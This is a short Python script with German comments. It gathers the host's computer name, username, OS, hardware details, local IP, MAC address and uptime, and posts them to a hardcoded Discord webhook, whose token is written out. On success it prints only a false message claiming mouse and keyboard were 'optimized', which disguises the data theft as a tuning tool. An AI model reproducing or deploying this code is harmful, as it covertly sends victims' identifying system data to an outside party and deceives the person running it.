import requests
import platform
import psutil
import socket
import uuid
import os
from datetime import datetime


# Discord Webhook URL
webhook_url = "https://discordapp.com/api/webhooks/1406422085433167985/UT_c-WldcZ9ak2KsfJzPCV7V-U_30cakRwd84Mc_OzEN7TuF1DVhF2u9ZqCNG802jZ4_"


# --- Allgemeine PC Infos ---
computer_name = platform.node()
username = psutil.Process().username()
os_info = f"{platform.system()} {platform.version()} ({platform.release()})"
cpu_info = platform.processor()
ram_gb = round(psutil.virtual_memory().total / (1024**3), 2)
ram_available_gb = round(psutil.virtual_memory().available / (1024**3), 2)
disk_usage = psutil.disk_usage('/')
disk_total_gb = round(disk_usage.total / (1024**3), 2)
disk_used_gb = round(disk_usage.used / (1024**3), 2)
disk_free_gb = round(disk_usage.free / (1024**3), 2)
ip_address = socket.gethostbyname(socket.gethostname())
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
for ele in range(0,8*6,8)][::-1])
uptime = datetime.now() - datetime.fromtimestamp(psutil.boot_time())


# --- Nachricht für Discord formatieren ---
message = f"```ini\n"
message += f"ComputerName = {computer_name}\n"
message += f"Username = {username}\n"
message += f"OS = {os_info}\n"
message += f"CPU = {cpu_info}\n"
message += f"RAM(GB) = {ram_gb} (Available: {ram_available_gb})\n"
message += f"Disk Total/Used/Free (GB) = {disk_total_gb}/{disk_used_gb}/{disk_free_gb}\n"
message += f"IP = {ip_address}\n"
message += f"MAC = {mac_address}\n"
message += f"Uptime = {str(uptime).split('.')[0]}\n"
message += f"```"


# --- Senden an Discord ---
data = {"content": message}
response = requests.post(webhook_url, json=data)


if response.status_code == 204:
print("Maus und Tastatur Optimiert.")
